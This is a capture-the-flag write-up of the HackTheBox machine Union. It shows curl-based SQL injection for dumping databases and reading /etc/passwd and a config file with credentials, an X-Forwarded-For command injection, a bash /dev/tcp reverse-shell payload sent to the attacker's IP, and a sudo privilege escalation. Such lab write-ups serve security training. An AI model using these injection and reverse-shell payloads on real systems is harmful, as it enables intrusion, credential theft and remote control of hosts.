---
title: "Walk-through of Union from HackTheBox"
header:
  teaser: /assets/images/2022-01-07-16-59-12.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - 
---

## Machine Information

![union](/assets/images/2022-01-07-16-59-12.png)

Union is a medium machine on HackTheBox. Created by [Ippsec](https://twitter.com/ippsec) for the [UHC](https://en.hackingesports.com.br/uhc) November 2021 finals it focuses on SQL Injection as an attack vector.

Our starting point is a website on port 80 which has an SQLi vulnerability. We use this to dump information from the backend database, which eventually leads to a flag we can submit on the website. This opens up port 22 for SSH access, and allows us to perform further SQLi attacks revealing credentials which we use to log in. Inspecting source code for the website reveals a vulnerability which we take advantage of using X-Forwarded-For headers, to get a reverse shell. Escalation to root is then trivial.

<!--more-->

Skills required are basic knowledge of SQLi. Skills learned are exploiting SQLi and X-Forwarded-For using curl.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Union](https://www.hackthebox.com/home/machines/profile/418) |
| Machine Release Date | 22nd November 2021 |
| Date I Completed It | 10th January 2022 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/unicode]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.128 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/unicode]
└─# nmap -p$ports -sC -sV -oA union 10.10.11.128
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-07 17:02 GMT
Nmap scan report for 10.10.11.128
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have a single open port, let's have a look:

![union-website](/assets/images/2022-01-07-17-20-02.png)

Not a lot here, let's check me to see if I can compete:

![union-website-pencer](/assets/images/2022-01-07-17-20-30.png)

I can! Clicking the link takes us to the challenge page where we need to enter a flag:

![union-website-flag](/assets/images/2022-01-07-17-22-04.png)

At this point there isn't a lot we can do, but of course this if CTF so we need to start looking closer. The machine name of union is a hint that our path forward here is via SQL injection. I've don'e a number of machines covering this before, probably the most relevant here is SQHell from TryHackMe. My post [here](https://pencer.io/ctf/ctf-thm-sqhell/) covers it in depth, so maybe have a look there first if you need a primer.

## SQLi Investigation

I prefer the command line for playing around so let's do this with curl. First test submitting a player:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl 10.10.11.128/index.php -d 'player=pencer' 
Congratulations pencer you may compete in this tournament!<br /><br />Complete the challenge <a href="/challenge.php">here</a>  
```

If we try the box creator ippsec we get a different result:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl 10.10.11.128/index.php -d 'player=ippsec'
Sorry, ippsec you are not eligible due to already qualifying. 
```

If we try the simplest of SQLi techniques which is a single quotation mark:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl 10.10.11.128/index.php -d "player=ippsec'"    
Congratulations ippsec' you may compete in this tournament!<br /><br />Complete the challenge <a href="/challenge.php">here</a>
```

That doesn't work, but if we put a comment after:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl 10.10.11.128/index.php -d "player=ippsec'-- -"
Sorry, ippsec you are not eligible due to already qualifying.
```

We can see it's worked because the check against the player name entered matches ippsec, so we know the characters after that have been injected.

## Database Enumeration

With this knowledge of how to exploit it we can now start to retrieve useful data from the backend databases. Just like we did in the SQHell room we can refer to the mysql docs. Following [this](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) we can look at the schemata:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl 10.10.11.128/index.php -d "player=pencer' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata -- -"
Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
```

That works and we retrieve the available databases. Let's tidy the response up using sed to display just the information we're interested in:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'
mysql,information_schema,performance_schema,sys,november
```

Above I've just used sed to cut the text before and after the response we wanted to see. Now we know the database is called november, let's see the tables:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select group_concat('TABLE:',TABLE_NAME,'---->-COLUMN:',COLUMN_NAME,'\n') from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'november' -- -" | sed 's/Sorry, //' | sed 's/,//' | sed 's/ you are not eligible due to already qualifying.//'
table:flag---->-column:one
table:players---->-column:player
```

Again, I've cut out the bit we are interested in and added labels to make it clear what we are looking at. We have two tables, let's look at them:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select group_concat(player) from players -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'
ippsec,celesian,big0us,luska,tinyboy
```

The players table has ippsec and a few others. Note i used group concat here to retrieve all items in the table and return them as a single entry. Without that you would only be able to see them one at a time by iterating through.

## UHC Flag

Now the flag table:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select group_concat(one) from flag -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'
UHC{F1rst_5tep_2_Qualify}
```

Just one entry which we can try on the website:

![union-website-flag-success](/assets/images/2022-01-10-22-00-11.png)

We can also do this with curl instead of the browser. Send the player request and view the header of the response:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -v -s 10.10.11.128/index.php -d "player=pencer"
*   Trying 10.10.11.128:80...
* Connected to 10.10.11.128 (10.10.11.128) port 80 (#0)
> POST /index.php HTTP/1.1
> Host: 10.10.11.128
> User-Agent: curl/7.79.1
> Accept: */*
> Content-Length: 13
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 08 Jan 2022 21:03:05 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=tie6r4uno69o57gbuesapskfku; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 10.10.11.128 left intact
Congratulations pencer you may compete in this tournament!<br /><br />Complete the challenge <a href="/challenge.php">here</a>
```

Take that Cookie which we see assigned to PHPSESSID above and use that with the flag we've found, send with curl:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -s -X POST -b 'PHPSESSID=tie6r4uno69o57gbuesapskfku' --data-binary 'flag=UHC{F1rst_5tep_2_Qualify}' 'http://10.10.11.128/challenge.php' -L | grep SSH
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
```

We see the same message as we did in the browser. Note I used the -L flag to tell curl to follow the redirect from the challenge.php page to the firewall.php page.

## PHP Session Manipulation

We don't noed to do any more here, but in the interests of improving our bashfu this could be taken one step further by using sed to cut out the response and put the PHPSESSID in to a variable:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# PHPSESSID=$(curl -v -s 10.10.11.128/index.php -d "player=pencer" 2>&1 | grep PHPSESSID | sed 's/< Set-Cookie: PHPSESSID=//' | sed 's/; path=\///')
```

Then we can use that variable whenever we need to authenticate our session. Here we can do the same as above but using out variable instead:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -s -X POST --cookie "PHPSESSID=$PHPSESSID" --data-binary 'flag=UHC{F1rst_5tep_2_Qualify}' 'http://10.10.11.128/challenge.php' -L
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->
<div class="container">
                <h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>
        </div>
        <section class="bg-dark text-center p-5 mt-4">
                <div class="container p-5">
              <h1 class="text-white">Welcome Back!</h1>
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
                </div>
        </section>
</div>
```

## SSH Access

That's enough playing around, let's check SSH is now open on port 22:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# nmap -p 22 10.10.11.128
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-09 17:09 GMT
Nmap scan report for 10.10.11.128
Host is up (0.023s latency).

PORT   STATE SERVICE
22/tcp open  ssh
```

It is and we can access SSH now but still need credentials. It's possible to read files using our SQLi, the docs [here](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file) point us to the load_file function. Let's grab the /etc/passwd file to test this:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select load_file('/etc/passwd') -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//' 2>&1 | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
htb:x:1000:1000:htb:/home/htb:/bin/bash
uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
```

We have three users that can logon. With more enumeration we can read other useful files, eventually I got to the web server config file:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -s 10.10.11.128/index.php -d "player=pencer' union select load_file('/var/www/html/config.php') -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'
<?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";
  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

Those credentials are reused for SSH access:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# ssh uhc@10.10.11.128
uhc@10.10.11.128's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)
Last login: Mon Nov  8 21:19:42 2021 from 10.10.14.8
uhc@union:~$
```

## User Flag

At last we're in but only as a low level user. Let's check who we are then grab the user flag:

```text
uhc@union:~$ id
uid=1001(uhc) gid=1001(uhc) groups=1001(uhc)

uhc@union:~$ cat user.txt 
cc9a85cd4613c6e45c718f8c2c075ff7
```

## Source Code Review

I didn't find a lot looking around the box, eventually looked to the web root and the firewall.php one is interesting:

```text
uhc@union:~$ cat /var/www/html/firewall.php
<?php
require('config.php');
<SNIP>
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
              <h1 class="text-white">Welcome Back!</h1>
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
                </div>
        </section>
</div>
```

## X-Forwarded-For Exploitation

It's using X-Forwarded-For (XFF) to identity the originating IP of the client. I covered exploiting this [here](https://pencer.io/ctf/ctf-thm-sqhell/#flag-2---blindtime---curl-method) on a TryHackMe room. Without sanitization of the user input this can be easily manipulated. Let's use this to grab the /etc/passwd file again:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -X GET -H 'X-FORWARDED-FOR: ;cat /etc/passwd;' --cookie "PHPSESSID=$PHPSESSID" 'http://10.10.11.128/firewall.php'
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->
<SNIP>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<SNIP>
```

## Reverse Shell

That works, so time to get a reverse shell. I just used a simple PenTestMonkey one, start a nc listening in another terminal then send this:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -X GET -H 'X-FORWARDED-FOR: ;bash -c "bash -i >& /dev/tcp/10.10.14.13/1337 0>&1";' --cookie "PHPSESSID=$PHPSESSID" 'http://10.10.11.128/firewall.php'
```

Switch to see we have our shell connected:

```sh
┌──(root💀kali)-[~]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.128] 35292
bash: cannot set terminal process group (805): Inappropriate ioctl for device
bash: no job control in this shell
www-data@union:~/html$ 
```

## Privilege Escalation

At first glance I'm thinking all that effort and I only get in as www-data, but checking sudo shows us the path to root is nice and simple:

```text
www-data@union:~/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on union:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
www-data@union:~/html$
```

## Root Flag

We can run any command as root, let's get that flag and finish the box:

```text
www-data@union:~/html$ sudo /bin/bash
sudo /bin/bash
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
fd73c7c952ca60ad21b71132697bdfd7
```

I hope you enjoyed that box as much as I did, especially trying to do as much as possible from the terminal.

That's another one done. See you next time.
